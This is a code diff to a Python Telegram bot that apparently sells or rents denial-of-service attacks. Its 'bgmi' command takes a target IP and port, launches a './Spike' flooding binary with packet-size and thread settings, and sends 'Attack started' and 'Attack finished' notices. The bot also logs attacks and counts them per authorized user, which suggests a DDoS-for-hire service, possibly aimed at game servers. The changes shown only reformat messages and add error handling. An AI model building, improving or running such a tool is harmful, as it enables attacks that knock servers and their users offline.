@@ -193,26 +193,27 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     ip, port = context.args[0], context.args[1]
-
     attack_running = True
     attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
 
     attack_details = (
-        f"🚀 Attack started!\n\n"
-        f"🎯 Target IP: `{ip}`\n"
-        f"🚪 Port: `{port}`\n"
-        f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
-        f"📅 Time: `{attack_time}`"
+        f"🚀 **Attack Started!**\n\n"
+        f"🎯 **Target IP:** `{ip}`\n"
+        f"🚪 **Port:** `{port}`\n"
+        f"⏰ **Duration:** `{MAX_ATTACK_TIME} seconds`\n"
+        f"📅 **Time:** `{attack_time}`"
     )
     await update.message.reply_text(attack_details, parse_mode="Markdown")
 
-    asyncio.create_task(run_attack(ip, port, user_id, context))
+    # Start the attack and ensure completion message is sent
+    asyncio.ensure_future(run_attack(ip, port, user_id, context))
 
 async def run_attack(ip, port, user_id, context):
     global attack_running, waiting_users
 
     try:
-        subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
+        # Start the attack process
+        process = subprocess.Popen(["./Spike", ip, port, str(MAX_ATTACK_TIME), str(DEFAULT_PACKET_SIZE), str(DEFAULT_THREADS)])
 
         attack_time = datetime.now(KOLKATA_TZ).strftime("%Y-%m-%d %H:%M:%S")
         
@@ -221,7 +222,7 @@ async def run_attack(ip, port, user_id, context):
 
         attack_logs.append({
             "user_id": user_id,
-            "username": username,  # Now correctly storing the username
+            "username": username,  
             "ip": ip,
             "port": port,
             "time": attack_time
@@ -230,20 +231,26 @@ async def run_attack(ip, port, user_id, context):
         if user_id in authorized_users:
             authorized_users[user_id]["attacks"] += 1
 
+        # Wait for the attack duration
         await asyncio.sleep(MAX_ATTACK_TIME)
 
-    finally:
-        attack_running = False
+    except Exception as e:
+        print(f"Error during attack: {e}")
 
+    finally:
+        # Ensure attack completion message is sent
+        attack_running = False
         attack_finished_message = (
-            f"✅ Attack finished!\n\n"
-            f"🎯 Target IP: `{ip}`\n"
-            f"🚪 Port: `{port}`\n"
-            f"⏰ Duration: `{MAX_ATTACK_TIME} seconds`\n"
-            f"📅 Time: `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
+            f"✅ **Attack Finished!**\n\n"
+            f"🎯 **Target IP:** `{ip}`\n"
+            f"🚪 **Port:** `{port}`\n"
+            f"⏰ **Duration:** `{MAX_ATTACK_TIME} seconds`\n"
+            f"📅 **Time:** `{datetime.now(KOLKATA_TZ).strftime('%Y-%m-%d %H:%M:%S')}`"
         )
+
         await context.bot.send_message(chat_id=user_id, text=attack_finished_message, parse_mode="Markdown")
 
+        # Notify waiting users
         if waiting_users:
             for user in waiting_users:
                 try:
@@ -252,6 +259,7 @@ async def run_attack(ip, port, user_id, context):
                     print(f"Failed to notify user {user}: {e}")
 
             waiting_users.clear()
+
 
 
 async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
